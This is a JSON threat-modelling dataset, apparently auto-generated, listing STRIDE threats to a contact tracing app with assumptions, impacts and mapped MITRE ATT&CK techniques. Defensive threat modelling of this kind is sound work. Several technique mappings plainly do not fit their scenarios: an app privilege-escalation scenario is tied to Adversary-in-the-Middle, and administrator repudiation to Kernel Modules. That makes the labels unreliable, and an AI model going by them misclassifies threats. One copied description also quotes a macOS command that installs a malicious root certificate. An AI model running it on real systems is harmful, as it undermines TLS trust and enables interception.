                "description": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\n\nDGAs can take the form of apparently random or \u201cgibberish\u201d strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)\n\nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",
                "id": "attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd",
                "technique_id": "T1568.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Centralized server is breached, exposing vast amounts of collected and sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Server lacks robust security measures.",
                    "Role": "Server",
                    "Condition": "Absence of strong network and application security controls."
                },
                {
                    "Assumption": "Attacker successfully bypasses firewall or intrusion detection systems.",
                    "Role": "Attacker",
                    "Condition": "Advanced technical capability and resources."
                },
                {
                    "Assumption": "Sensitive data is stored unencrypted.",
                    "Role": "Server",
                    "Condition": "Weak data protection policies."
                }
            ],
            "Potential Impact": "Massive data breach resulting in loss of personally identifiable information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data breach",
                "centralized system",
                "server compromise"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack on the centralized server.",
            "Assumptions": [
                {
                    "Assumption": "Server is not protected against high volume traffic.",
                    "Role": "Server",
                    "Condition": "Insufficient DDoS mitigation mechanisms."
                },
                {
                    "Assumption": "Attacker can generate large volumes of traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to a botnet or similar attack infrastructure."
                },
                {
                    "Assumption": "No rate limiting applied to incoming traffic.",
                    "Role": "Server",
                    "Condition": "Network controls do not include rate limiting or traffic analysis."
                }
            ],
            "Potential Impact": "Service disruptions causing inability to access or upload contact tracing data.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "traffic flooding",
                "server disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious user flood the contact tracing app with bogus proximity data.",
            "Assumptions": [
                {
                    "Assumption": "No mechanisms to detect and filter out spam data.",
                    "Role": "Application",
                    "Condition": "Lack of spam filtering or anomaly detection in data collection."
                },
                {
                    "Assumption": "Attackers have tools to generate large volumes of fake Bluetooth signals.",
                    "Role": "Attacker",
                    "Condition": "Availability of custom hardware or software to generate Bluetooth data."
                },
                {
                    "Assumption": "System does not validate proximity data before processing.",
                    "Role": "Server",
                    "Condition": "Weakness in proximity data verification processes."
                }
            ],
            "Potential Impact": "Performance degradation and potential crashes of the contact tracing app.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "data flooding",
                "application performance",
                "fake data"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An adversary targets the central database with numerous read/write operations to exhaust resources.",
            "Assumptions": [
                {
                    "Assumption": "Database lacks sufficient indexing and resource management.",
                    "Role": "Database",
                    "Condition": "Suboptimal database configuration."
                },
                {
                    "Assumption": "No application rate limiting present.",
                    "Role": "Application",
                    "Condition": "Lack of controls to limit frequency and volume of database queries."
                },
                {
                    "Assumption": "Incident response measures are weak or slow.",
                    "Role": "Security Team",
                    "Condition": "Inadequate real-time monitoring and response capabilities."
                }
            ],
            "Potential Impact": "Database slowdown or complete unavailability, affecting data access for all users.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "database",
                "resource exhaustion",
                "query flood"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A regular user finds a vulnerability allowing them to gain administrative access to the server.",
            "Assumptions": [
                {
                    "Assumption": "Presence of unpatched vulnerabilities in the server software.",
                    "Role": "Server",
                    "Condition": "Outdated software with known exploits."
                },
                {
                    "Assumption": "User has the technical skills to exploit the vulnerability.",
                    "Role": "User",
                    "Condition": "User with technical proficiency discovers the vulnerability."
                },
                {
                    "Assumption": "Server does not enforce strict access control.",
                    "Role": "Server",
                    "Condition": "Lack of role-based access control implementation."
                }
            ],
            "Potential Impact": "Complete takeover of server operations, leading to unauthorized data manipulation and exposure.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "server access",
                "administrative control"
            ],
            "mitre_technique": {
                "name": "Trusted Relationship",
                "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",
                "id": "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925",
                "technique_id": "T1199"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious app exploits a vulnerability to gain higher privileges in the device operating system.",
            "Assumptions": [
                {
                    "Assumption": "Device operating system has known vulnerabilities.",
                    "Role": "Device",
                    "Condition": "The operating system is outdated or unpatched."
                },
                {
                    "Assumption": "User grants excessive permissions to the app.",
                    "Role": "User",
                    "Condition": "User is unaware of the permissions implications."
                },
                {
                    "Assumption": "App store security measures are inadequate.",
                    "Role": "App Store",
                    "Condition": "Weak application vetting processes."
                }
            ],
            "Potential Impact": "Malware gaining control over the device, leading to potential data loss and system manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "mobile device",
                "OS vulnerability",
                "malware"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a man-in-the-middle attack to escalate privileges on the centralized servers.",
            "Assumptions": [
                {
                    "Assumption": "Encryption of server communication channels is weak or absent.",
                    "Role": "Server",
                    "Condition": "Improperly configured TLS or other encryption protocols."
                },
                {
                    "Assumption": "Attacker has the ability to intercept and manipulate data in transit.",
                    "Role": "Attacker",
                    "Condition": "Presence in the same network or ability to hijack network connections."
                },
                {
                    "Assumption": "No mutual authentication between client and server.",
                    "Role": "Server",
                    "Condition": "One-sided SSL/TLS configuration or absence of mutual authentication."
                }
            ],
            "Potential Impact": "Unauthorized data modifications, service disruptions, and exposure of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "man-in-the-middle",
                "server communication",
                "network interception"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "27",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could create a fake contact tracing application to steal user credentials and data.",
            "Assumptions": [
                {
                    "Assumption": "Users may not verify the authenticity of the application before installing.",
                    "Role": "User",
                    "Condition": "When users download the app from unofficial sources."
                },
                {
                    "Assumption": "The operating system does not enforce strong app verification.",
                    "Role": "Operating System",
                    "Condition": "When security settings are relaxed to allow installations from unknown sources."
                },
                {
                    "Assumption": "There are no mechanisms in place to verify the legitimacy of the server.",
                    "Role": "Application Developer",
                    "Condition": "When the app lacks server-side validation and certification."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive user data.",
            "MITRE ATT&CK Keywords": [
                "application layer spoofing",
                "credential theft",
                "phishing",
                "data theft"
            ],
            "mitre_technique": {
                "name": "Malicious File",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
                "technique_id": "T1204.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof Bluetooth signals to create false proximity records.",
            "Assumptions": [
                {
                    "Assumption": "Devices do not authenticate Bluetooth signals.",
                    "Role": "Application Developer",
                    "Condition": "When the contact tracing app simply relies on detected Bluetooth signals."
                },
                {
                    "Assumption": "Bluetooth specification allows for easy signal impersonation.",
                    "Role": "Technology Standard",
                    "Condition": "When the Bluetooth protocol does not enforce strong authentication."
                },
                {
                    "Assumption": "Users' devices are susceptible to Bluetooth spoofing attacks.",
                    "Role": "User Device",
                    "Condition": "When device firmware is outdated or lacks security patches."
                }
            ],
            "Potential Impact": "Corruption of proximity data and false exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "Bluetooth spoofing",
                "proximity data manipulation",
                "signal impersonation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the identity of health officials to send fake exposure notifications.",
            "Assumptions": [
                {
                    "Assumption": "There is no strong authentication mechanism for health official communications.",
                    "Role": "Application Developer",
                    "Condition": "When the application relies on weak or no verification of sender identity."
                },
                {
                    "Assumption": "Users trust notifications without verifying their authenticity.",
                    "Role": "User",
                    "Condition": "When users believe all notifications coming from the app."
                },
                {
                    "Assumption": "Attackers can access the communication channel used by health officials.",
                    "Role": "Attacker",
                    "Condition": "When communication channels are not secure against interception."
                }
            ],
            "Potential Impact": "Disruption of the trust in the application and potentially causing panic among users.",
            "MITRE ATT&CK Keywords": [
                "identity spoofing",
                "fake notifications",
                "trust exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could alter the app's code to collect additional unauthorized data from users.",
            "Assumptions": [
                {
                    "Assumption": "The application's code is not protected against tampering.",
                    "Role": "Application Developer",
                    "Condition": "When code integrity checks are not implemented."
                },
                {
                    "Assumption": "Users can be convinced to download a modified version of the app.",
                    "Role": "User",
                    "Condition": "When users download updates from unofficial sources."
                },
                {
                    "Assumption": "There is no robust validation mechanism for app updates.",
                    "Role": "Application Developer",
                    "Condition": "When updates are not signed and verified."
                }
            ],
            "Potential Impact": "Compromise of data integrity and unauthorized data collection.",
            "MITRE ATT&CK Keywords": [
                "code tampering",
                "app modification",
                "unauthorized data collection",
                "malicious updates"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could intercept and modify data being transmitted between the mobile application and server.",
            "Assumptions": [
                {
                    "Assumption": "The data transmission is not properly encrypted.",
                    "Role": "Application Developer",
                    "Condition": "When data-in-transit is not encrypted using strong protocols like TLS."
                },
                {
                    "Assumption": "The attacker has access to the network channel.",
                    "Role": "Attacker",
                    "Condition": "When attackers can perform Man-in-the-Middle attacks on unsecured networks."
                },
                {
                    "Assumption": "There is no integrity check for received data.",
                    "Role": "Application Developer",
                    "Condition": "When the application server does not verify the integrity of received data."
                }
            ],
            "Potential Impact": "Corruption of transmitted data, leading to false exposure notifications and breach of data integrity.",
            "MITRE ATT&CK Keywords": [
                "data transmission tampering",
                "network interception",
                "man-in-the-middle",
                "data integrity compromise"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could modify log files on user devices to hide malicious actions.",
            "Assumptions": [
                {
                    "Assumption": "Log files are not protected against unauthorized access.",
                    "Role": "Application Developer",
                    "Condition": "When log files are stored without access control mechanisms."
                },
                {
                    "Assumption": "The device is compromised by malware that has access to the file system.",
                    "Role": "User Device",
                    "Condition": "When the device is infected with malware that can escalate privileges."
                },
                {
                    "Assumption": "There are no integrity checks for log files.",
                    "Role": "Application Developer",
                    "Condition": "When log files are not hashed and verified regularly."
                }
            ],
            "Potential Impact": "Hiding malicious actions and compromising the forensic investigation process.",
            "MITRE ATT&CK Keywords": [
                "log file tampering",
                "malware",
                "privilege escalation",
                "forensic data compromise"
            ],
            "mitre_technique": {
                "name": "Indicator Removal from Tools",
                "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
                "id": "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6",
                "technique_id": "T1066"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user might deny having been in proximity to an infected individual despite the app indicating otherwise.",
            "Assumptions": [
                {
                    "Assumption": "The proximity data is not non-repudiable.",
                    "Role": "Application Developer",
                    "Condition": "When the data collection method does not ensure undeniable proof of interactions."
                },
                {
                    "Assumption": "There are no usage logs with tamper-evident properties.",
                    "Role": "Application Developer",
                    "Condition": "When log files are not protected and can be easily modified."
                },
                {
                    "Assumption": "There is a lack of persistent device identifiers.",
                    "Role": "Application Developer",
                    "Condition": "When temporary IDs are used without linkage to permanent IDs."
                }
            ],
            "Potential Impact": "Confusion and potential legal disputes related to exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "data repudiation",
                "proof of interaction",
                "dispute resolution"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Health authorities may deny sending certain notifications if users claim misinformation.",
            "Assumptions": [
                {
                    "Assumption": "Notifications lack a digital signature to verify origin.",
                    "Role": "Application Developer",
                    "Condition": "When notifications are sent without cryptographic signatures."
                },
                {
                    "Assumption": "There is insufficient logging of notification messages.",
                    "Role": "Application Developer",
                    "Condition": "When the server does not keep detailed logs of all notifications sent."
                },
                {
                    "Assumption": "Users have no way to independently verify notification authenticity.",
                    "Role": "User",
                    "Condition": "When users are not provided with tools to validate notifications."
                }
            ],
            "Potential Impact": "Mistrust in the system and potential spread of erroneous information.",
            "MITRE ATT&CK Keywords": [
                "notification repudiation",
                "message non-repudiation",
                "digital signature enforcement"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Server administrators could deny unauthorized access and data manipulation.",
            "Assumptions": [
                {
                    "Assumption": "Audit logs are not tamper-proof.",
                    "Role": "Application Developer",
                    "Condition": "When audit logs can be modified or deleted without detection."
                },
                {
                    "Assumption": "There is no mechanism to detect unauthorized changes.",
                    "Role": "System Administrator",
                    "Condition": "When the system lacks monitoring tools to identify unauthorized access."
                },
                {
                    "Assumption": "Administrators have high-level access without proper oversight.",
                    "Role": "System Administrator",
                    "Condition": "When administrators are not subject to least privilege principles."
                }
            ],
            "Potential Impact": "Lack of accountability and potential cover-up of malicious activities.",
            "MITRE ATT&CK Keywords": [
                "denial of access",
                "log tampering",
                "audit trail integrity"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could capture BLE/GPS proximity data to track users\u2019 locations.",
            "Assumptions": [
                {
                    "Assumption": "Proximity data is not encrypted.",
                    "Role": "Application Developer",
                    "Condition": "When proximity data is transmitted or stored in clear text."
                },
                {
                    "Assumption": "Attackers have access to the communication channels.",
                    "Role": "Attacker",
                    "Condition": "When attackers can perform network sniffing or tap into BLE signals."
                },
                {
                    "Assumption": "The application does not use adequate privacy-preserving techniques.",
                    "Role": "Application Developer",
                    "Condition": "When the application fails to anonymize or pseudonymize proximity data."
                }
            ],
            "Potential Impact": "Unauthorized tracking of users\u2019 movements and locations.",
            "MITRE ATT&CK Keywords": [
                "BLE data disclosure",
                "GPS data leakage",
                "user tracking",
                "proximity data capture"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A malicious actor could access sensitive health data stored on user devices through malware.",
            "Assumptions": [
                {
                    "Assumption": "User devices lack strong security protections.",
                    "Role": "User",
                    "Condition": "When devices do not have up-to-date security patches and anti-malware software."
                },
                {
                    "Assumption": "The app stores sensitive data locally without encryption.",
                    "Role": "Application Developer",
                    "Condition": "When sensitive data is stored in clear text on the device."
                },
                {
                    "Assumption": "The device is already compromised by malware with escalated privileges.",
                    "Role": "User Device",
                    "Condition": "When malware has bypassed device security measures."
                }
            ],
            "Potential Impact": "Unauthorized access to users\u2019 personal and health information.",
            "MITRE ATT&CK Keywords": [
                "device data breach",
                "malware",
                "data theft",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Encrypted/Encoded File",
                "description": "Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.(Citation: File obfuscation) Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded File) \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) execution.",
                "id": "attack-pattern--0d91b3c0-5e50-47c3-949a-2a796f04d144",
                "technique_id": "T1027.013"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider threat could misuse access to central servers to leak sensitive user data.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have sufficient privileges to access sensitive data.",
                    "Role": "Insider",
                    "Condition": "When access controls do not enforce the principle of least privilege."
                },
                {
                    "Assumption": "Insider activity is not monitored effectively.",
                    "Role": "System Administrator",
                    "Condition": "When logging and monitoring mechanisms are inadequate or not reviewed."
                },
                {
                    "Assumption": "There are no proper checks and balances for data access.",
                    "Role": "Application Developer",
                    "Condition": "When sensitive operations do not require multi-factor authentication or supervisory approval."
                }
            ],
            "Potential Impact": "Exposure of sensitive health information resulting in potential identity theft and privacy violations.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "data leakage",
                "privileged abuse",
                "insider access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could flood the central server with fake data submissions, overwhelming the system.",
            "Assumptions": [
                {
                    "Assumption": "The server does not implement rate limiting or input validation.",
                    "Role": "Application Developer",
                    "Condition": "When the server accepts unlimited data submissions without checks."
                },
                {
                    "Assumption": "The attacker can generate a large volume of fake data.",
                    "Role": "Attacker",
                    "Condition": "When the attacker has sufficient computational resources."
                },
                {
                    "Assumption": "There are no defenses against distributed denial-of-service (DDoS) attacks.",
                    "Role": "System Administrator",
